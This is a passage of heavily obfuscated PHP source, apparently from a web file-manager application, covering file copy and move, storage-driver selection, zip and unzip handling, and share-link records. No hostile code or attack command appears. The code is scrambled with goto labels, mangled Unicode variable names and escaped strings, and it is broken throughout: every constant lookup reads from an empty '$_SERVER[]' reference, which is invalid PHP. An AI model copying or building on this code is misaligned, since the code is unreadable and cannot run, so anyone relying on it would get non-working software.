CУ: self::copyMoveKeepInfo($a͊, $D, $A͚); return $A͚; goto C݆; bې: $c =& $_SERVER[]; $c = empty($fŎ) && $fŎ !== $c[191] ? $a͊->pathThis($D) : $fŎ; if ($Bۄ) { $eބ = $d×ޏ->fileNameExist($Fۗ⩋, $c); $c = $d×ޏ->fileNameAuto($Fۗ⩋, $c, $Bۄ, !$E׻); $Bۄ = $eބ ? $Bۄ : !1; } goto BٌË; BٌË: if ($E׻) { return self::copyFile($a͊, $D, $d×ޏ, $Fۗ⩋, $c, $dě); } if ($Bۄ == REPEAT_RENAME_FOLDER) { $Bۄ = !1; } $c罾 = rtrim($Fۗ⩋, $c[8]) . $c[8] . $c; goto Dʩ; C݆: } private static function copyFile($B, $f֗, $aź䈭, $A, $aق, $Aї) { goto bєӻ; f: self::remove($d); Hook::trigger($CÌ[1061], $B, $f֗, $aź䈭, $A, $aق, $e); self::copyMoveKeepInfo($B, $f֗, $e); goto cΕĒ; cџ: if ($GLOBALS[$CÌ[6]][$CÌ[88]][$CÌ[766]]) { $Fㄋ = $GLOBALS[$CÌ[6]][$CÌ[88]][$CÌ[766]]; } $Aї = !0; $b؍ = $Fㄋ; goto bֈ; bֈ: mk_dir($b؍); $dＸ = $b؍ . $C®; $d = $dＸ; goto fӍ醾; fӍ醾: $dＸ = $B->download($f֗, $dＸ); $dＸ = $B->iconvApp($dＸ); $e = $aź䈭->upload($A, $dＸ, $Aї); goto f; bєӻ: $CÌ =& $_SERVER[]; $A = $aź䈭->getPath(rtrim($A, $CÌ[8]) . $CÌ[8] . $aق); $C® = $CÌ[1059] . time() . rand_string(5); goto Aݥ; cΕĒ: return $e; goto Eҋ; Aݥ: Hook::trigger($CÌ[1060], $B, $f֗, $aź䈭, $A, $aق, $C®); if (self::driverIsSame($B, $aź䈭)) { if ($Aї) { $e = $aź䈭->moveFile($f֗, $A); } else { $e = $aź䈭->copyFile($f֗, $A); } Hook::trigger($CÌ[1061], $B, $f֗, $aź䈭, $A, $aق, $e); self::copyMoveKeepInfo($B, $f֗, $e); return $e; } $Fㄋ = TEMP_FILES; goto cџ; Eҋ: } private static function copyMoveKeepInfo($f̊, $BΨ, $e) { if (!$e) { return; } $dԱ = $f̊->info($BΨ); if (!is_array($dԱ)) { return; } IO::setModifyTime($e, $dԱ[$_SERVER[][84]]); } public static function pathFather($b䍇) { $F̮ = IO::init($b䍇); $CӍ = $F̮->pathFather($F̮->path); return $F̮->getPathOuter($CӍ); } public static function fileOut($E݅͜, $B = false, $e = false, $Cґ = '') { $bƶ = self::driverMake($E݅͜); if ($bƶ->isFileOutServer()) { return $bƶ->fileOutServer($E݅͜, $B, $e, $Cґ); } return $bƶ->fileOut($E݅͜, $B, $e, $Cґ); } public static function fileOutImage($BƇ, $d = 250) { $F = array(250, 600, 1200, 3000, 5000); for ($c۟ = 0; $c۟ < count($F); $c۟++) { if ($c۟ == 0 && $d <= $F[$c۟]) { $d = $F[$c۟]; break; } else { if ($d > $F[$c۟ - 1] && $d <= $F[$c۟]) { $d = $F[$c۟]; break; } else { if ($c۟ == count($F) - 1 && $d > $F[$c۟]) { $d = $F[$c۟]; break; } } } } $aŨ̌ = self::driverMake($BƇ); if ($aŨ̌->isFileOutServer()) { return $aŨ̌->fileOutImageServer($BƇ, $d); } return $aŨ̌->fileOutImage($BƇ, $d); } private static function driverIsSame($bݵ׫, $A땭) { goto cŃ; e쨈: if ($bݵ׫->pathDriver == $A땭->pathDriver) { return !0; } return !1; goto e; a۳: if ($E႐ != $Dا) { return !1; } if ($E႐ == $D[724]) { return !0; } if ($E႐ == $D[106]) { return !0; } goto e쨈; cŃ: $D =& $_SERVER[]; $E႐ = $bݵ׫->getType(); $Dا = $A땭->getType(); goto a۳; e: } public static function copyUpdate($fϷխ, $BϬқ) { goto F未; F未: $C =& $_SERVER[]; if (!IO::exist($fϷխ)) { return !1; } if (!IO::exist($BϬқ)) { IO::mkdir($BϬқ); } goto Dۊ; Dۊ: $C = self::_listAll($fϷխ); $Aގ = self::_listAll($BϬқ); $d紟 = array(); goto f; f: $c鸺 = array(); foreach ($C as $Fк => $a) { if (isset($Aގ[$Fк])) { if ($a[$C[77]] == 1) { continue; } if ($Aގ[$Fк][$C[78]] == $a[$C[78]]) { continue; } } if ($a[$C[77]] == 1) { $c鸺[] = $BϬқ . $C[8] . $Fк; continue; } $bϐ = strstr(trim($Fк, $C[8]), $C[8]) ? get_path_father($Fк) : $C[33]; $d紟[] = array($C[1062] => $a[$C[76]], $C[1063] => rtrim($BϬқ, $C[8]) . $C[8] . $bϐ, $C[1064] => $a); } $C = array($C[193] => $d紟, $C[77] => $c鸺); goto Eʎ; Eʎ: Hook::trigger($C[1065], $fϷխ, $BϬқ, $C); foreach ($c鸺 as $a) { IO::mkdir($a); } foreach ($d紟 as $a) { IO::copy($a[$C[1062]], $a[$C[1063]], REPEAT_REPLACE); } goto Cʵ; Cʵ: } private static function _listAll($CƤ) { $A =& $_SERVER[]; $CƤ = KodIO::clear($CƤ); $d͊ȴ = IO::listAll($CƤ); foreach ($d͊ȴ as &$bן) { $Cţ = substr($bן[$A[76]], strlen($CƤ)); $bן[$A[1066]] = trim($Cţ, $A[8]); } unset($bן); return array_to_keyvalue($d͊ȴ, $A[1066]); } public static function fileSubstr($C̽, $fً, $e = false) { goto Aّ; bї̵ى: if ($e === !1) { $e = $B֏ - $fً; } if ($fً + $e > $B֏) { $e = $B֏ - $fً; } if (!$B֏ && $E̠->getType() == $Eո[106] && !$E̠->exist($C̽)) { throw new Exception($Eո[1067] . LNG($Eո[1068]) . $Eո[931] . get_path_this($C̽) . $Eո[33]); } goto e腆; Aّ: $Eո =& $_SERVER[]; $E̠ = self::driverMake($C̽); $B֏ = $E̠->size($C̽); goto Bͺ; e腆: if ($e <= 0) { return $Eո[33]; } if ($fً < 0 || $fً >= $B֏ || $e > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\145\122\x65\141\x64\40\x65\x72\162\157\x72\x21\40\163\164\x61\162\164\x3d{$fً}\73\154\145\156\147\x74\150\x3d{$e}\73\x20\163\x69\x7a\x65\x3d{$B֏}\x3b"); } $e둌 = $E̠->fileSubstr($C̽, $fً, $e); goto E§¯; E§¯: if (!$e둌 && $e && isset($GLOBALS[$Eո[1069]])) { throw new Exception($GLOBALS[$Eո[1069]][$Eո[1070]]); } return $e둌; goto A䝙; Bͺ: $c荦 = $fً; $dڝ = $e; if ($fً < 0) { $fً = $B֏ + $fً; } goto bї̵ى; A䝙: } private static function driverMake(&$FՍ) { goto b; C: return $eط; goto cɧ; b: $C =& $_SERVER[]; $fß = KodIO::parse($FՍ); if (!self::$driverListSystem) { $b = Model($C[733])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($b, $C[393]); } goto c⌅͋; c⌅͋: if ($fß[$C[29]] == KodIO::KOD_IO && !self::$driverListSystem[$fß[$C[393]]]) { return !1; } $FՍ = $fß[$C[1071]]; $eط = self::driverGet($fß, $FՍ); goto C; cɧ: } private static function driverGet($c, &$b暉) { goto F̺; D𠆭: if (isset($fߞ[$Bʙ[6]][$Bʙ[1083]])) { $cق->pathBase = rtrim($fߞ[$Bʙ[6]][$Bʙ[1083]], $Bʙ[8]) . $Bʙ[8]; $b暉 = $cق->pathBase . ltrim($b暉, $Bʙ[8]); } $b暉 = $cق->getPath($b暉); if (isset($c[$Bʙ[1055]])) { $b暉 = $c[$Bʙ[1055]]; } goto fԿ; d͗: switch ($c[$Bʙ[29]]) { case KodIO::KOD_IO: $fߞ = self::$driverListSystem[$Eϐڒ]; break; case KodIO::KOD_SOURCE: $b暉 = $Eϐڒ . $b暉; $fߞ = array($Bʙ[1073] => $Bʙ[1074], $Bʙ[6] => $c); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $b̡ = $GLOBALS[$Bʙ[1075]]; self::$driverListUser = array_to_keyvalue($b̡, $Bʙ[393]); } $fߞ = self::$driverListUser[$Eϐڒ]; break; case KodIO::KOD_SHARE_LINK: $fߞ = array($Bʙ[1073] => $Bʙ[1076], $Bʙ[6] => $c); $b = Action($Bʙ[1077])->sharePathInfo($c[$Bʙ[76]]); $b暉 = $b[$Bʙ[395]]; if (!$b[$Bʙ[395]]) { $cɧ = Model($Bʙ[563])->getInfo($b[$Bʙ[468]]); $b暉 = KodIO::clear($cɧ[$Bʙ[1078]] . $c[$Bʙ[1071]]); $c[$Bʙ[466]] = $cɧ; $c[$Bʙ[1055]] = $b暉; $fߞ = array($Bʙ[1073] => $Bʙ[1079], $Bʙ[6] => $c); } break; case KodIO::KOD_SHARE_ITEM: $fߞ = array($Bʙ[1073] => $Bʙ[1080], $Bʙ[6] => $c); $cɧ = Model($Bʙ[563])->getInfo($c[$Bʙ[393]]); if ($cɧ[$Bʙ[395]] == $Bʙ[191]) { $b暉 = KodIO::clear($cɧ[$Bʙ[1078]] . $c[$Bʙ[1071]]); $c[$Bʙ[466]] = $cɧ; $c[$Bʙ[1055]] = $b暉; $fߞ = array($Bʙ[1073] => $Bʙ[1081], $Bʙ[6] => $c); } else { if (!$b暉) { $b暉 = $cɧ[$Bʙ[395]]; } } break; default: $b暉 = $c[$Bʙ[76]]; $fߞ = array($Bʙ[1073] => $Bʙ[1082]); break; } $A趷 = $c[$Bʙ[76]]; if (!isset(self::$driverCache[$A趷])) { $F넱 = strtolower($fߞ[$Bʙ[94]]); $f = $GLOBALS[$Bʙ[6]][$Bʙ[88]][$Bʙ[797]]; $eȄ = $Bʙ[72] . (isset($f[$F넱]) ? $f[$F넱] : ucfirst($F넱)); if (!class_exists($eȄ)) { show_json("{$eȄ}\x20\156\x6f\x74\40\x65\x78\151\x73\x74\163\x21", !1); } $F葃 = isset($fߞ[$Bʙ[6]]) ? $fߞ[$Bʙ[6]] : !1; self::$driverCache[$A趷] = new $eȄ($F葃); } goto b錱; fԿ: $cق->path = $b暉; return $cق; goto B; F̺: $Bʙ =& $_SERVER[]; $cΏ = $c[$Bʙ[1072]]; $Eϐڒ = $c[$Bʙ[393]]; goto d͗; b錱: $cق = self::$driverCache[$A趷]; $cق->pathDriver = $cΏ; $cق->pathBase = $Bʙ[33]; goto D𠆭; B: } public static function errorTips($F = false) { goto fՉȵ; fՉȵ: $a船 =& $_SERVER[]; static $C = array(); $bɰ = 1000; goto EА; EА: if ($F === -1) { return $C ? $C[count($C) - 1] : $a船[33]; } if ($F === !1) { return implode($a船[229], $C); } if (count($C) >= $bɰ) { $C = array_slice($C, $bɰ * 0.5, $bɰ); } goto dᒖ; dᒖ: $C[] = $F; write_log($a船[160] . ACTION . $a船[1084] . $F, $a船[1085]); goto Eמ; Eמ: } public static function getLastError($D回 = '') { $E = self::errorTips(-1); return $E ? $E : $D回; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $bݟ; if (!$bݟ) { $Dĉ = IO::init($_SERVER[][8]); } return $Dĉ; } private static function iconvSystem($eİ) { return self::local()->iconvSystem($eİ); } private static function iconvApp($cײѩ) { return self::local()->iconvApp($cײѩ); } public static function zip($dǥ, $Cĺ슜 = "\172\151\x70", $bù = '', $Aˏ = REPEAT_RENAME) { goto Dʌ; E֔Ǚ: $f󥍒ɷ = !1; if (!$bù && $bԠ->getType() == $D苤[106]) { $d = self::zipFileList($dǥ); } else { $f󥍒ɷ = $bù ? $bù : TEMP_FILES . $D苤[1086] . time() . rand_string(8) . $D苤[8]; mk_dir($f󥍒ɷ); $d = self::zipFileList($dǥ, $f󥍒ɷ); } $F = $Fꬃ[$D苤[28]]; goto AŔ; C: $d䏆 = $e . $F . $D苤[95] . $Cĺ슜; $d䏆 = get_filename_auto($d䏆, $D苤[33], $Aˏ); $A = self::iconvSystem($d䏆); goto Bќ; aӹ: if ($bù || !$f󥍒ɷ) { if ($f󥍒ɷ && strstr($f󥍒ɷ, TEMP_FILES)) { $c㔫ܚ = $d = array(); recursion_dir($e, $c㔫ܚ, $d, 0); foreach ($c㔫ܚ as $cׯ) { del_dir($cׯ); } foreach ($d as $aĎƅȨ) { if ($aĎƅȨ == $A) { continue; } del_file($aĎƅȨ); } } return $d䏆; } $Eƍޢ = self::pathFather($Fꬃ[$D苤[76]]); $c؞ܻ = self::move($d䏆, $Eƍޢ, $Aˏ); goto b⫊; b⫊: if (!$c؞ܻ) { del_dir($f󥍒ɷ); show_json(LNG($D苤[1088]), !1); } del_dir($f󥍒ɷ); return $c؞ܻ; goto F; Dʌ: $D苤 =& $_SERVER[]; $bԠ = self::init($dǥ[0][$D苤[76]]); $Fꬃ = self::info($dǥ[0][$D苤[76]]); goto E֔Ǚ; AŔ: if (count($d) > 1) { $CбӢ = IO::info(IO::pathFather($Fꬃ[$D苤[76]])); $F = $CбӢ[$D苤[28]]; } $e = $f󥍒ɷ; if (!$e) { $e = get_path_father($Fꬃ[$D苤[76]]); if (!$bù && $bԠ->getType() == $D苤[106]) { $e = get_path_father($bԠ->path); } $A = IO::info($e); if (!$A[$D苤[196]]) { show_json(LNG($D苤[1087]), !1); } } goto C; Bќ: foreach ($d as $dܩ => $c␭ￕ) { $d[$dܩ] = self::iconvSystem($c␭ￕ); } KodArchive::create($A, $d); if (!IO::exist($d䏆)) { if ($f󥍒ɷ) { del_dir($f󥍒ɷ); } show_json(LNG($D苤[1088]), !1); } goto aӹ; F: } public static function unzip($dޥ㫎, $Bܹ = "\x72\x65\x70\154\x61\143\x65") { goto e; f賏: return !0; goto a׺; E: foreach ($Fш as $aІ) { $aІ = self::iconvApp($aІ); self::move($aІ, $Eň̷, $Bܹ); } del_dir($d); if (!$EŮ) { del_file($Aᇢ); } goto f賏; e: $BՔө =& $_SERVER[]; $Bנ = $dޥ㫎[$BՔө[76]]; $Eň̷ = $dޥ㫎[$BՔө[1089]]; goto DХ; D: if (!@file_exists(self::iconvSystem($Aᇢ))) { $EŮ = self::localFilePath($Bנ, $eȪ͵); $Aᇢ = $EŮ ? $EŮ : parent::download($Bנ, $Aᇢ); } $Aᇢ = self::iconvSystem($Aᇢ); $DĖ褐 = isset($dޥ㫎[$BՔө[1091]]) ? $dޥ㫎[$BՔө[1091]] : $BՔө[1092]; goto aٶ; D뭏: mk_dir($d); $eȪ͵ = self::fileExt($E㉉); $Aᇢ = $d . $BՔө[95] . $eȪ͵; goto D; d̑: $A׼߶ = self::tmpFileName($E㉉); $d = TEMP_FILES . $A׼߶; del_dir($d); goto D뭏; fư: Hook::trigger($BՔө[1096], $d); recursion_dir($d, $AŞ, $e̥, 0); $Fш = array_merge($AŞ, $e̥); goto E; DХ: if (!($E㉉ = parent::info($Bנ))) { show_json(LNG($BՔө[1090]), !1); } if (!($a = parent::infoFull($Eň̷))) { $Eň̷ = parent::mkdir($Eň̷); $a = array($BՔө[76] => $Eň̷); } else { if (isset($a[$BՔө[395]]) && trim($a[$BՔө[76]], $BՔө[8]) != trim($Eň̷, $BՔө[8])) { $Eכ = KodIO::make($a[$BՔө[478]]); $A = parent::fileNameAuto($Eכ, $a[$BՔө[28]], REPEAT_RENAME_FOLDER, !0); $Eň̷ = parent::mkdir($Eכ . $A); $a = array($BՔө[76] => $Eň̷); } } $Eň̷ = $a[$BՔө[76]]; goto d̑; aٶ: $eʜ = KodArchive::extract($Aᇢ, $d . $BՔө[8], $DĖ褐); self::archiveExt(); if (!$eʜ[$BՔө[1093]]) { show_json($BՔө[1094] . $eʜ[$BՔө[1095]], !1); } goto fư; a׺: } public static function unzipList($fɥ) { goto EΧͿ; C˪: if (!is_dir($B)) { mk_dir($B); } $f = $B . $dת[8] . $e; if (!@file_exists(self::iconvSystem($f))) { if (isset($E)) { url_request($Fא鰆, $dת[1100], $f); } else { $fœ죄 = self::localFilePath($Fא鰆, $c); $f = $fœ죄 ? $fœ죄 : self::download($Fא鰆, $f); } } goto f; fޘ: $f = json_encode($E[$dת[1095]]); self::setContent($Bڴ, $f); if (count($E[$dת[1095]]) >= $AĚ) { show_json(sprintf(LNG($dת[1099]), count($E[$dת[1095]])), !1); } goto Aɕ; f: $f = self::iconvSystem($f); if ($C >= 0) { $Bɯݔ = isset($fɥ[$dת[1101]]) ? $fɥ[$dת[1101]] : !1; $f幫 = isset($fɥ[$dת[28]]) ? $fɥ[$dת[28]] : $dת[33]; KodArchive::filePreview($f, $C, $Bɯݔ, $f幫); self::archiveExt(); die; } $E = KodArchive::listContent($f); goto eӾ; EΧͿ: $dת =& $_SERVER[]; $Fא鰆 = $fɥ[$dת[76]]; $C = isset($fɥ[$dת[1097]]) ? $fɥ[$dת[1097]] : -1; goto bŌ; A: if (isset($E)) { $Eͦ = array($E[$dת[76]], $E[$dת[1097]], $E[$dת[28]]); $e = md5(implode($dת[71], $Eͦ)) . $dת[95] . get_path_ext($E[$dת[28]]); } else { $Eͦ = array($Aн[$dת[28]], $Aн[$dת[76]], $Aн[$dת[78]]); $e = md5(implode($dת[71], $Eͦ)) . $dת[95] . $c; } if ($C == -1) { $Bڴ = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\x69\x65\x77\57{$e}\57{$e}\x2e\154\x6f\x67"; $a = self::infoFull($Bڴ); if ($a) { $Bڴ = $a[$dת[76]]; $Cξ = self::getContent($Bڴ); if ($Cξ) { $f = json_decode($Cξ, !0); if (count($f) >= $AĚ) { show_json(sprintf(LNG($dת[1099]), count($f)), !1); } return $f; } } else { $Bڴ = self::mkfile($Bڴ); } } $B = TEMP_FILES . $e; goto C˪; bŌ: $AĚ = 50000; if (request_url_safe($Fא鰆)) { $E = parse_url_query($Fא鰆); if (!isset($E[$dת[76]])) { show_json($dת[1098], !1); } } $aޖ͸ = isset($E) ? $E[$dת[76]] : $Fא鰆; goto b݊ޕ; Aɕ: return $E[$dת[1095]]; goto eć; eӾ: self::archiveExt(); del_dir($B); if (!$E[$dת[1093]]) { show_json($E[$dת[1095]], !1); } goto fޘ; b݊ޕ: $Aн = self::info($aޖ͸); $c = self::fileExt($Aн); $e = self::tmpFileName($Aн); goto A; eć: } private static function fileExt($CꍩȐ) { $a֗ =& $_SERVER[]; $d҂Ǐ = $CꍩȐ[$a֗[168]]; if ($d҂Ǐ == $a֗[1102]) { $fӕ = $a֗[1103]; if (substr($CꍩȐ[$a֗[28]], -strlen($fӕ)) == $fӕ) { $d҂Ǐ = $a֗[1104]; } } self::archiveExt($d҂Ǐ); return $d҂Ǐ; } private static function zipFileList($cΨ, $D = false) { $A =& $_SERVER[]; $dȯ暑 = array(); foreach ($cΨ as $C׆Ҋ) { $a؞ = $C׆Ҋ[$A[76]]; if ($D) { $a؞ = self::copy($C׆Ҋ[$A[76]], $D, $A[789]); } else { $D = self::init($C׆Ҋ[$A[76]]); if ($D->getType() == $A[106]) { $a؞ = $D->path; } } if ($a؞ && self::local()->exist($a؞)) { $dȯ暑[$C׆Ҋ[$A[76]]] = $a؞; } } if (!empty($dȯ暑)) { return array_values($dȯ暑); } show_json(LNG($A[1068]), !1); } public static function tmpFileName($C໹) { $Dׄ =& $_SERVER[]; $C޹⇈ = array($C໹[$Dׄ[28]], $C໹[$Dׄ[76]], $C໹[$Dׄ[78]], $C໹[$Dׄ[487]]); return md5(implode($Dׄ[71], $C޹⇈)); } private static function localFilePath($Aԓ, $fß) { goto Fϼ; Fϼ: $Fˏ =& $_SERVER[]; if ($fß == $Fˏ[1105] && strtoupper(substr(PHP_OS, 0, 3)) == $Fˏ[1106]) { return !1; } $Bˌ = KodIO::parse($Aԓ); goto f; f: if ($Bˌ[$Fˏ[29]] == KodIO::KOD_SOURCE) { $DĢ = Model($Fˏ[796])->fileInfoGet(KodIO::sourceID($Aԓ)); if (!$DĢ[$Fˏ[76]]) { show_json($Fˏ[1107], !1); } $Aԓ = $DĢ[$Fˏ[76]]; } $aⲖ = self::init($Aԓ); $F躥 = $aⲖ->getType(); goto a˄; a˄: if ($F躥 == $Fˏ[106] || $F躥 == $Fˏ[1108]) { if (!$aⲖ->exist($aⲖ->path)) { show_json(LNG($Fˏ[105]), !1); } return $aⲖ->path; } return !1; goto a; a: } private static function archiveExt($Eϼ = '') { $GLOBALS[$_SERVER[][1109]] = $Eϼ; } } goto Cњ; aټ: class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\171\124\151\x6d\x65", "\164\x69\155\145", "\151\156\x73\145\x72\164\x2c\165\x70\x64\x61\164\145", "\146\x75\156\143\164\151\157\156"), array("\143\x72\145\141\x74\x65\x54\151\155\x65", "\164\x69\155\x65", "\151\156\x73\x65\162\x74", "\146\x75\x6e\x63\x74\x69\x6f\156"), array("\x6f\x70\x74\151\157\x6e\x73", '', "\x69\156\163\145\162\164\x2c\165\x70\144\x61\x74\x65\54\x73\145\x6c\x65\143\x74", "\152\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($A) { $fؼҮ =& $_SERVER[]; $FϺ = isset($A[0]) ? $A[0] : !1; return array($fؼҮ[1829] => array(USER_ID, $fؼҮ[1830]), $fؼҮ[1773] => array($FϺ, $fؼҮ[1831])); } protected function listSimple() { $DιǗ = array($_SERVER[][1533] => USER_ID); $aշ = $this->field($this->fieldList)->where($DιǗ)->select(); return $aշ ? $aշ : array(); } protected function getInfo($F佒, $C = false) { $c =& $_SERVER[]; if ($C) { return $this->_getShareInfo(array($c[468] => $F佒)); } $f = $this->cacheFunctionGet($c[1780], $F佒); return $f; } public function getInfoByHash($F) { return $this->_getShareInfo(array($_SERVER[][470] => $F)); } public function getInfoByPath($E𚩊) { $e֍喲 =& $_SERVER[]; $E󼗽 = array($e֍喲[1533] => USER_ID, $e֍喲[395] => $E𚩊); return $this->_getShareInfo($E󼗽); } public function getInfoBySourcePath($C) { $BĻ =& $_SERVER[]; $F = array($BĻ[1533] => USER_ID, $BĻ[1078] => $C); return $this->_getShareInfo($F); } private function _getShareInfo($Bޑ) { goto Bű; cԲɄ: $Bޑ = array($c[468] => $A[$c[468]]); $B␼ = $c[1832]; $aЪ = Model($c[564])->order($c[393])->field($B␼)->where($Bޑ)->select(); goto f; f: if ($A[$c[395]] == $c[191]) { $A[$c[85]] = IO::info($A[$c[1078]]); } else { $A[$c[85]] = Model($c[1213])->pathInfo($A[$c[395]]); } $A[$c[1833]] = $aЪ; return $A; goto D; Bű: $c =& $_SERVER[]; $A = $this->where($Bޑ)->find(); if (!$A) { return !1; } goto cԲɄ; D: } protected function getInfoAuth($C񯭻) { $A =& $_SERVER[]; $F񇆅 = $this->getInfo($C񯭻); $F񇆅[$A[406]] = Model($A[482])->authMake($F񇆅[$A[1833]]); return $F񇆅; } protected function listData($Cհ = null, $E = 300) { $c =& $_SERVER[]; $d = array(array($c[473] => array($c[976], 0), $c[475] => array($c[976], 0), $c[1834] => $c[1788])); if ($Cհ == $c[1835]) { $d = array($c[473] => 1); } else { if ($Cհ == $c[1063]) { $d = array($c[475] => 1); } } $d[$c[1533]] = USER_ID; $B = $this->where($d)->selectPage($E); return $B; } protected function listToMe($E = 300) { goto BŊ֑; BŊ֑: $D졅 =& $_SERVER[]; $BײΕ = Model($D졅[1836])->userGroupParents(USER_ID); $E = array($D졅[549] => SourceModel::TYPE_USER, $D졅[484] => USER_ID); goto b،; aی: $A = array($D졅[1838] => $Fݰǚ, $D졅[1839] => $e[$D졅[364]]); return $A; goto aٰ; b،: if ($BײΕ) { $E = array(array($D졅[549] => SourceModel::TYPE_USER, $D졅[484] => USER_ID), array($D졅[549] => SourceModel::TYPE_GROUP, $D졅[484] => array($D졅[7], $BײΕ)), $D졅[1834] => $D졅[1788]); } $e = Model($D졅[564])->where($E)->selectPage($E); $e = array_to_keyvalue_group($e[$D졅[367]], $D졅[468]); goto Eă; Bұ: $Fݰǚ = $this->field($E͸)->where($E)->select(); foreach ($Fݰǚ as $Aѓ => &$aɶ؞σ) { $aɶ؞σ[$D졅[1833]] = $e[$aɶ؞σ[$D졅[468]]]; } unset($aɶ؞σ); goto aی; Eă: if (!$e) { return $e; } $E͸ = $D졅[1837]; $E = array($D졅[468] => array($D졅[411], array_keys($e))); goto Bұ; aٰ: } protected function shareAdd($D߬ڔ, $F͸Ê) { $B =& $_SERVER[]; $E = $this->_addShareData($D߬ڔ, $F͸Ê); if (!empty($F͸Ê[$B[1840]])) { $this->_shareAuthSet($E, $F͸Ê[$B[1840]]); } $this->shareEventAdd($D߬ڔ, $F͸Ê, $B[1066]); return $E; } private function shareEventAdd($e۩Э, $F, $FӐ = "\x61\x64\144") { goto D₍҉; B: $Eѣ = $this->getInfoByPath($e۩Э); $fֹ = $e˷[1843]; if ($Eѣ[$e˷[473]] == $e˷[191] && $F[$e˷[473]] == $e˷[87]) { $fֹ = $e˷[1841]; } goto dਜ਼Ū; D₍҉: $e˷ =& $_SERVER[]; if (!$e۩Э || $e۩Э == $e˷[191]) { return; } if ($FӐ == $e˷[1066]) { if ($F[$e˷[473]] == $e˷[87]) { Model($e˷[533])->eventShare($e۩Э, $e˷[1841]); } if ($F[$e˷[475]] == $e˷[87]) { Model($e˷[533])->eventShare($e۩Э, $e˷[1842]); } return; } goto B; dਜ਼Ū: if ($Eѣ[$e˷[473]] == $e˷[87] && $F[$e˷[473]] == $e˷[191]) { $fֹ = $e˷[1844]; } if ($Eѣ[$e˷[475]] == $e˷[191] && $F[$e˷[475]] == $e˷[87]) { $fֹ = $e˷[1842]; } if ($Eѣ[$e˷[475]] == $e˷[87] && $F[$e˷[475]] == $e˷[191]) { $fֹ = $e˷[1845]; } goto A; A: Model($e˷[533])->eventShare($e۩Э, $fֹ); return; goto E֗; E֗: } private function _addShareData($fǤ, $Eƒ = array()) { goto aå; CҚ: $D՚ԭ = $this->add($B); $D֤ = array($b[470] => short_id($D՚ԭ)); $this->where(array($b[467] => $D՚ԭ))->save($D֤); goto a͌; a䥿: $B = array($b[1525] => USER_ID, $b[410] => $fǤ, $b[1439] => $b[33], $b[473] => 0, $b[475] => 0, $b[1078] => $b[33], $b[305] => $b[33], $b[856] => $b[33], $b[1847] => 0, $b[1848] => 0, $b[476] => 0, $b[477] => $b[33], $b[470] => $b[33]); $Aˢ = explode($b[47], $b[1849]); foreach ($Aˢ as $e) { if (!isset($Eƒ[$e])) { continue; } $B[$e] = $Eƒ[$e]; } goto CҚ; aå: $b =& $_SERVER[]; $B炈̋ = array($b[410] => $fǤ, $b[1525] => USER_ID); if ($fǤ == 0) { $B炈̋ = array($b[1846] => $Eƒ[$b[1078]], $b[1525] => USER_ID); } goto d; a͌: return $D՚ԭ; goto bĥ; d: if ($Fɳ = $this->where($B炈̋)->find()) { return $Fɳ[$b[468]]; } if ($fǤ == 0) { $D܎ = array($b[28] => get_path_this($Eƒ[$b[76]])); } else { $D܎ = Model($b[796])->sourceInfo($fǤ); if (!$D܎) { return !1; } } if (!$Eƒ[$b[1439]]) { $Eƒ[$b[1439]] = $D܎[$b[28]]; } goto a䥿; bĥ: } private function _shareAuthSet($dǼ, $Eٌ) { goto AȻ; AȻ: $eԅ˃̍ =& $_SERVER[]; if (!is_array($Eٌ)) { return !1; } $E = Model($eԅ˃̍[1800]); goto DÖ; DÖ: $E->where(array($eԅ˃̍[468] => $dǼ))->delete(); $fԲ = array(); foreach ($Eٌ as $d˩) { $a֚ = SourceModel::TYPE_USER; if ($d˩[$eԅ˃̍[404]] == SourceModel::TYPE_GROUP) { $a֚ = SourceModel::TYPE_GROUP; } $b·ɛ = array($eԅ˃̍[468] => $dǼ, $eԅ˃̍[404] => $a֚, $eԅ˃̍[484] => intval($d˩[$eԅ˃̍[484]]), $eԅ˃̍[1796] => 0, $eԅ˃̍[1850] => -1); if ($d˩[$eԅ˃̍[1796]]) { $b·ɛ[$eԅ˃̍[1796]] = $d˩[$eԅ˃̍[1796]]; } else { if ($d˩[$eԅ˃̍[1850]]) { $b·ɛ[$eԅ˃̍[1850]] = $d˩[$eԅ˃̍[1850]]; } } $fԲ[] = $b·ɛ; } goto fپȤ; fپȤ: return $E->addAll($fԲ, array(), !0); goto D񤐚; D񤐚: } public function numViewAdd($fҜ) { $D =& $_SERVER[]; $bʘ = array($D[467] => $fҜ); $this->where($bʘ)->setAdd($D[1847]); } public function numDownloadAdd($D飆) { $D砸 =& $_SERVER[]; $D = array($D砸[467] => $D飆); $this->where($D)->setAdd($D砸[1848]); } protected function shareEdit($Fѩ, $e) { goto Fጬ; Fጬ: $fǩˇ =& $_SERVER[]; $c = $this->getInfo($Fѩ); if (!$c) { return !1; } goto E鏝; EӖ: foreach ($D˒ as $Fο) { if (!array_key_exists($Fο, $e)) { continue; } $D[$Fο] = $e[$Fο]; } $this->shareEventAdd($c[$fǩˇ[395]], $e, $fǩˇ[1668]); $this->where(array($fǩˇ[467] => $Fѩ))->save($D); goto Cؕ; E鏝: $this->_checkLinkShare($e, $c); $D = array(); $D˒ = explode($fǩˇ[47], $fǩˇ[1851]); goto EӖ; Cؕ: if (isset($e[$fǩˇ[1840]])) { $this->_shareAuthSet($Fѩ, $e[$fǩˇ[1840]]); } return !0; goto aԐ; aԐ: } private function _checkLinkShare($A层, $C) { goto d; f咑: $dߞ = $this->shareFileMeta($D֓[$cūˍ[447]]); if (isset($dߞ[$cūˍ[372]]) && $dߞ[$cūˍ[372]] == $cūˍ[87]) { show_json(LNG($cūˍ[1854]), !1); } goto DСǳ; B: if ($C[$cūˍ[85]][$cūˍ[29]] != $cūˍ[193]) { $A = $this->_folderReport($c); if (!$A) { return; } show_json(LNG($cūˍ[1852]) . $cūˍ[1853] . $A, !1); } $D֓ = Model($cūˍ[796])->fileInfoGet($C[$cūˍ[85]][$cūˍ[395]]); if (!$D֓) { return; } goto f咑; d: $cūˍ =& $_SERVER[]; if ($A层[$cūˍ[473]] != $cūˍ[87]) { return; } $c = $C[$cūˍ[85]][$cūˍ[395]]; goto B; DСǳ: } private function 